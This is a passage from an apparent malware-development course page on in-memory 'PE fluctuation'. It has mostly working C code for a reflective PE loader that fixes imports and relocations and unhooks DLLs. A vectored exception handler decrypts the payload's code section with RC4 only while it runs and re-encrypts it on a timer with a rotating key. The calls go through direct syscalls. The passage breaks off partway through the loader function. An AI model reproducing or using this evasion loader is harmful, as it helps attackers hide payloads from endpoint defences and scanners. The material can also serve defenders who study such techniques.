		<span class="token comment">// Check the exception address. If the exception address is coming from inside of the RX (.text) memory, it's handled</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span>pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionAddress <span class="token operator">&gt;=</span> g_uPeTextAddress <span class="token operator">&amp;&amp;</span> pExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionAddress <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>g_uPeTextAddress <span class="token operator">+</span> g_sPeTextSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			NTSTATUS	STATUS			    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
			DWORD		dwOldProtection		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
			PVOID		pTmpPeTextAddress	<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span>g_uPeTextAddress<span class="token punctuation">;</span>
			SIZE_T		sTmpPeTextSize		<span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>g_sPeTextSize<span class="token punctuation">;</span>


			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_hTimerQueue <span class="token operator">||</span> <span class="token operator">!</span>g_hTimer<span class="token punctuation">)</span>
				<span class="token keyword">goto</span> _FAILURE<span class="token punctuation">;</span>

			<span class="token comment">// Decrypt the PE's encrypted data - and allow execution</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Rc4EncryptDecrypt</span><span class="token punctuation">(</span>g_uPeTextAddress<span class="token punctuation">,</span> g_sPeTextSize<span class="token punctuation">,</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token keyword">goto</span> _FAILURE<span class="token punctuation">;</span>
			
			<span class="token comment">// Execute the 'ObfuscationTimerCallback' callback function after 'EXEC_WAIT' seconds to re-encrypt </span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_WinAPI<span class="token punctuation">.</span><span class="token function">pCreateTimerQueueTimer</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_hTimer<span class="token punctuation">,</span> g_hTimerQueue<span class="token punctuation">,</span> <span class="token punctuation">(</span>WAITORTIMERCALLBACK<span class="token punctuation">)</span>ObfuscationTimerCallback<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> EXEC_WAIT <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				<span class="token keyword">goto</span> _FAILURE<span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token keyword">return</span> EXCEPTION_CONTINUE_EXECUTION<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>


_FAILURE<span class="token operator">:</span>
	<span class="token keyword">return</span> EXCEPTION_CONTINUE_SEARCH<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-14">Using Critical Sections</h3>
<p>Critical Sections were first introduced in the <em>Utilizing Hardware Breakpoints For Hooking (1)</em>
 module and are used to ensure thread safety and synchronization when 
running a multi-threaded program. This is done by initializing a section
 of code that will only be executed by one thread at a time. In this 
module, critical sections will be used in the <code>Rc4EncryptDecrypt</code> function.</p>
<p><code>Rc4EncryptDecrypt</code> is executed from within the VEH function, <code>PeFluctuationVectoredExceptionHandler</code>, and <code>CreateTimerQueueTimer</code>'s
 callback function. Since the implementation will have no control over 
when exceptions are raised, it is advised to use critical sections from 
within <code>Rc4EncryptDecrypt</code> to avoid running it twice at the same time, once being as a callback function and the other from the VEH function.</p>
<p>The implementation will utilize the following WinAPIs while working with critical sections:</p>
<ul>
<li>
<p><code>InitializeCriticalSection</code> - Initializes a critical section object by populating a <code>CRITICAL_SECTION</code> structure.</p>
</li>
<li>
<p><code>EnterCriticalSection</code> - Enters a critical section, 
indicating that the calling thread wants to access a shared resource 
protected by the critical section.</p>
</li>
<li>
<p><code>LeaveCriticalSection</code> - Releases a critical section, indicating that the calling thread has finished accessing the shared resource.</p>
</li>
</ul>
<p><code>InitializeCriticalSection</code> will be called before the first execution of the <code>Rc4EncryptDecrypt</code> function. On the other hand, <code>EnterCriticalSection</code> will be invoked at the start of <code>Rc4EncryptDecrypt</code>, while <code>LeaveCriticalSection</code> will be called at the end of the function.</p>
<h3 id="toc-heading-15">Random RC4 Key Generator</h3>
<p>The current setup for our RC4 functions makes use of the same key for
 all encryption and decryption routines during the PE payload execution.
 This is a serious weakness and should be avoided by rotating the key. 
Therefore, the <code>Rc4EncryptDecrypt</code> function will undergo a 
modification to alter the key after a set number of invocations. Our 
updated function will modify the key after the 20th execution of the <code>Rc4EncryptDecrypt</code> function, meaning after being called 10 times for encryption and 10 times for decryption of the <code>.text</code> section of the PE payload.</p>
<p>Keep in mind that the RC4 key can only be changed when the data is 
decrypted because if the key were to change while data is still 
encrypted, the decryption process would then use a different key which 
would result in corrupted data resulting in a process crash. Therefore, 
in addition to having <code>Rc4EncryptDecrypt</code> monitor the number of invocations, it must also check if the PE payload's <code>.text</code>
 section is decrypted. If so, then it would execute the code to change 
the RC4 key. The steps below will outline exactly what the updated code 
will do to update the RC4 key.</p>
<ul>
<li>
<p>Increment the global variable <code>g_dwDataStatus</code>, which is used to determine the data's state (whether decrypted or encrypted).</p>
</li>
<li>
<p>Increment the global variable <code>g_dwCycleCounter</code>, which is used to track the number of times the <code>Rc4EncryptDecrypt</code> function has been called.</p>
</li>
<li>
<p>When data is decrypted, assign a new random value to the local variable <code>bSeed</code>. This variable will be utilized in the code for altering the RC4 key.</p>
</li>
<li>
<p>Whenever the value of <code>g_dwCycleCounter</code> equals the constant <code>KEY_CHANGE_CYCLE_NMBR</code>, and <code>g_dwDataStatus</code> equals <code>DATA_DECRYPTED</code>, the RC4 key will undergo XOR operations with random values retrieved from the PE itself.</p>
</li>
<li>
<p>After the key alteration, reset the global variable <code>g_dwCycleCounter</code>.</p>
</li>
<li>
<p>When <code>g_dwDataStatus</code> matches the constant <code>DATA_DECRYPTED</code>, reset the <code>g_dwDataStatus</code> as well.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">RC4_KEY_SIZE</span>			<span class="token expression"><span class="token number">0x10</span>	</span><span class="token comment">// 16 byte</span></span>

<span class="token comment">// Data state:</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">DATA_ENCRYPTED</span>			<span class="token expression"><span class="token number">0x01</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">DATA_DECRYPTED</span>			<span class="token expression"><span class="token number">0x02</span></span></span>

<span class="token comment">// The number of times "Rc4EncryptDecrypt" should be invoked before changing the key:</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span>		<span class="token macro-name">KEY_CHANGE_CYCLE_NMBR</span>		<span class="token expression"><span class="token number">20</span>				</span></span>

<span class="token comment">// The initial Rc4 key:</span>
BYTE		g_Rc4Key<span class="token punctuation">[</span>RC4_KEY_SIZE<span class="token punctuation">]</span>	<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x01</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Used to determine the state of the injected PE file in memory (encrypted or not):</span>
DWORD		g_dwDataStatus			<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
<span class="token comment">// Used to determine when to change the rc4 key (when g_dwCycleCounter == KEY_CHANGE_CYCLE_NMBR):	</span>
DWORD		g_dwCycleCounter		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>		


BOOL <span class="token function">Rc4EncryptDecryptDemo</span><span class="token punctuation">(</span>IN PBYTE pBuffer<span class="token punctuation">,</span> IN DWORD dwBufferLen<span class="token punctuation">,</span> IN BOOL bDecrypt<span class="token punctuation">)</span><span class="token punctuation">{</span>

	BYTE	bSeed	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token comment">// Increment the global counters:</span>
	<span class="token comment">// This will help in determining the data state in memory (encrypted nor decrypted).</span>
	g_dwDataStatus<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token comment">// When g_dwCycleCounter == KEY_CHANGE_CYCLE_NMBR, the rc4 key is changed</span>
	g_dwCycleCounter<span class="token operator">++</span><span class="token punctuation">;</span>

	<span class="token comment">// Set a new seed that can be used for the new rc4 key</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		bSeed <span class="token operator">=</span> pBuffer<span class="token punctuation">[</span>bSeed <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">/*
		Encrypt / Decrypt
	*/</span>
	
	<span class="token comment">// Change the rc4 key </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwCycleCounter <span class="token operator">&gt;=</span> KEY_CHANGE_CYCLE_NMBR <span class="token operator">&amp;&amp;</span> g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// Fast algorithm to completely change the rc4 key</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> RC4_KEY_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
				g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pBuffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> bSeed<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">else</span>
				g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g_Rc4Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> bSeed<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Reset the counter </span>
		g_dwCycleCounter <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Reset the counter </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span>
		g_dwDataStatus <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-16">The Complete Rc4EncryptDecrypt Function</h4>
<p>The <code>Rc4EncryptDecrypt</code> function is shown below after updating it to use critical sections and rotating the RC4 key after each 20th invocation.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">Rc4EncryptDecrypt</span><span class="token punctuation">(</span>IN PBYTE pBuffer<span class="token punctuation">,</span> IN DWORD dwBufferLen<span class="token punctuation">,</span> IN BOOL bDecrypt<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token comment">// Enter a critical section</span>
	g_WinAPI<span class="token punctuation">.</span><span class="token function">pEnterCriticalSection</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_CriticalSection<span class="token punctuation">)</span><span class="token punctuation">;</span>

	NTSTATUS	STATUS			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	USTRING		uStrBuffer		<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> pBuffer<span class="token punctuation">,</span>  <span class="token punctuation">.</span>Length <span class="token operator">=</span> dwBufferLen<span class="token punctuation">,</span>  <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> dwBufferLen <span class="token punctuation">}</span><span class="token punctuation">;</span>
	USTRING		uStrKey			<span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>Buffer <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">,</span> <span class="token punctuation">.</span>Length <span class="token operator">=</span> RC4_KEY_SIZE<span class="token punctuation">,</span> <span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> RC4_KEY_SIZE <span class="token punctuation">}</span><span class="token punctuation">;</span>
	DWORD		dwOldProtection	<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PVOID		pTmpBuffer		<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span>pBuffer<span class="token punctuation">;</span>
	SIZE_T		sTmpBufferLen	<span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>dwBufferLen<span class="token punctuation">;</span>
	BYTE		bSeed			<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pTmpBuffer <span class="token operator">||</span> <span class="token operator">!</span>sTmpBufferLen<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Change the target's memory permissions to RW to allow encrypting (it was RO)</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTmpBufferLen<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	

	<span class="token comment">// Increment the global counters:</span>
	<span class="token comment">// This will help in determining the data state in memory.</span>
	g_dwDataStatus<span class="token operator">++</span><span class="token punctuation">;</span>
	<span class="token comment">// When g_dwCycleCounter == KEY_CHANGE_CYCLE_NMBR, the rc4 key is changed</span>
	g_dwCycleCounter<span class="token operator">++</span><span class="token punctuation">;</span>

	<span class="token comment">// Set a new seed that can be used for the new rc4 key</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		bSeed <span class="token operator">=</span> pBuffer<span class="token punctuation">[</span>bSeed <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Encrypt/Decrypt input data</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> g_WinAPI<span class="token punctuation">.</span><span class="token function">pSystemFunction032</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>uStrBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>uStrKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Change the rc4 key </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwCycleCounter <span class="token operator">&gt;=</span> KEY_CHANGE_CYCLE_NMBR <span class="token operator">&amp;&amp;</span> g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// Fast algorithm to completely change the rc4 key</span>
		<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> RC4_KEY_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
				g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pBuffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> bSeed<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">else</span>
				g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> g_Rc4Key<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g_Rc4Key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> bSeed<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Reset the counter </span>
		g_dwCycleCounter <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Reset the counter </span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>g_dwDataStatus <span class="token operator">==</span> DATA_DECRYPTED<span class="token punctuation">)</span>
		g_dwDataStatus <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token comment">// Change the memory permissions to RO/RX.</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sTmpBufferLen<span class="token punctuation">,</span> <span class="token punctuation">(</span>bDecrypt <span class="token operator">==</span> TRUE <span class="token operator">?</span> PAGE_EXECUTE_READ <span class="token operator">:</span> PAGE_READONLY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldProtection<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	
	<span class="token comment">// Leave the critical section</span>
	g_WinAPI<span class="token punctuation">.</span><span class="token function">pLeaveCriticalSection</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_CriticalSection<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-17">The LocalPeExecAndFluctuate Function</h3>
<p>The <code>LocalPeExecAndFluctuate</code> function invokes most of the
 implementation's code. The main purpose of this function is to execute 
the PE payload and start PeFluctuation (i.e. memory encryption). 
Additionally, it also calls the <code>UnhookAllLoadedDlls</code> function after fixing the IAT to unhook the newly loaded DLL modules.</p>
<p><code>LocalPeExecAndFluctuate</code> is shown below where it accepts only one parameter, <code>pPeHdrs</code>, representing the pointer of an initialized <code>PE_HDRS</code> structure.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL <span class="token function">LocalPeExecAndFluctuate</span><span class="token punctuation">(</span>IN PPE_HDRS pPeHdrs<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pPeHdrs<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	NTSTATUS		STATUS			        <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PBYTE			pPeBaseAddress		    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T			sPeSize			        <span class="token operator">=</span> <span class="token punctuation">(</span>SIZE_T<span class="token punctuation">)</span>pPeHdrs<span class="token operator">-&gt;</span>pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>SizeOfImage<span class="token punctuation">;</span>
	PVOID			pVectoredExptnHandler	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
				    pEntryPoint		        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	DLLMAIN			pDllMain		        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	MAIN			pMain			        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// Initialize a critical section (used in Rc4EncryptDecrypt)</span>
	g_WinAPI<span class="token punctuation">.</span><span class="token function">pInitializeCriticalSection</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_CriticalSection<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Allocate enough memory to hold the decompressed pe</span>
	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtAllocateVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pPeBaseAddress<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sPeSize<span class="token punctuation">,</span> MEM_RESERVE <span class="token operator">|</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Calculate the entry point</span>
	pEntryPoint <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pPeHdrs<span class="token operator">-&gt;</span>pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>AddressOfEntryPoint<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Move the pe's section to the allocated memory</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pPeHdrs<span class="token operator">-&gt;</span>pImgNtHdrs<span class="token operator">-&gt;</span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">Memcpy</span><span class="token punctuation">(</span>
			<span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeBaseAddress <span class="token operator">+</span> pPeHdrs<span class="token operator">-&gt;</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">,</span>
			<span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pPeHdrs<span class="token operator">-&gt;</span>pFileBuffer <span class="token operator">+</span> pPeHdrs<span class="token operator">-&gt;</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">)</span><span class="token punctuation">,</span>
			pPeHdrs<span class="token operator">-&gt;</span>pImgSecHdr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>SizeOfRawData
		<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Set up the IAT</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FixImportAddressTable</span><span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pEntryImportDataDir<span class="token punctuation">,</span> pPeBaseAddress<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Fix relocation</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FixReloc</span><span class="token punctuation">(</span>pPeHdrs<span class="token operator">-&gt;</span>pEntryBaseRelocDataDir<span class="token punctuation">,</span> pPeBaseAddress<span class="token punctuation">,</span> pPeHdrs<span class="token operator">-&gt;</span>pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>ImageBase<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Set memory permissions. The 'FixMemPermissions' function will initialize the 'g_uPeTextAddress' and 'g_sPeTextSize' global variables</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">FixMemPermissions</span><span class="token punctuation">(</span>pPeBaseAddress<span class="token punctuation">,</span> pPeHdrs<span class="token operator">-&gt;</span>pImgNtHdrs<span class="token punctuation">,</span> pPeHdrs<span class="token operator">-&gt;</span>pImgSecHdr<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_uPeTextAddress <span class="token operator">||</span> <span class="token operator">!</span>g_sPeTextSize<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

	<span class="token comment">// Set up a VEH that will execute 'UnhookingVectoredExceptionHandler' if an exception is triggered while unhooking</span>
